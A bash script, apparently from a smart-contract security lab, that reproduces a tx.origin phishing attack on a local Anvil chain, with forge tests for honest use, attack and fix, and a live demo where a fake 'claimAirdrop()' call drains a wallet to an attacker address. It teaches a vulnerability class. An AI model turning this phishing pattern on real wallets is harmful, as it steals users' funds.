#!/usr/bin/env bash
# defi21 — tx.origin phishing. Reproduces the 3-act forge test AND the live Anvil phish.
# Requires: foundry (forge, cast, anvil). No network needed.
set -e
forge test -vv            # ACT 1 honest (10->7) / ACT 2 attack (10->0) / ACT 3 fix (revert)

echo "=== live Anvil phish: the internal ETH transfer wallet -> attacker ==="
anvil --port 8579 --silent & AN=$!; sleep 2
RPC=http://127.0.0.1:8579
OWNERK=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80   # owner = tx.origin
ATTACKER=0x00000000000000000000000000000000000A11cE                          # fresh, 0 balance
WALLET=$(forge create src/Wallet.sol:Wallet --rpc-url $RPC --private-key $OWNERK --broadcast --value 0.02ether 2>/dev/null | grep "Deployed to:" | awk '{print $3}')
ATK=$(forge create src/Attack.sol:Attack   --rpc-url $RPC --private-key $OWNERK --broadcast --constructor-args "$WALLET" "$ATTACKER" 2>/dev/null | grep "Deployed to:" | awk '{print $3}')
echo "BEFORE  wallet=$(cast balance $WALLET --rpc-url $RPC)  attacker=$(cast balance $ATTACKER --rpc-url $RPC)"
TX=$(cast send $ATK "claimAirdrop()" --rpc-url $RPC --private-key $OWNERK 2>/dev/null | grep transactionHash | awk '{print $2}')
echo "AFTER   wallet=$(cast balance $WALLET --rpc-url $RPC)  attacker=$(cast balance $ATTACKER --rpc-url $RPC)"
echo "--- internal call trace (where the ETH moved) ---"
cast run $TX --rpc-url $RPC
kill $AN
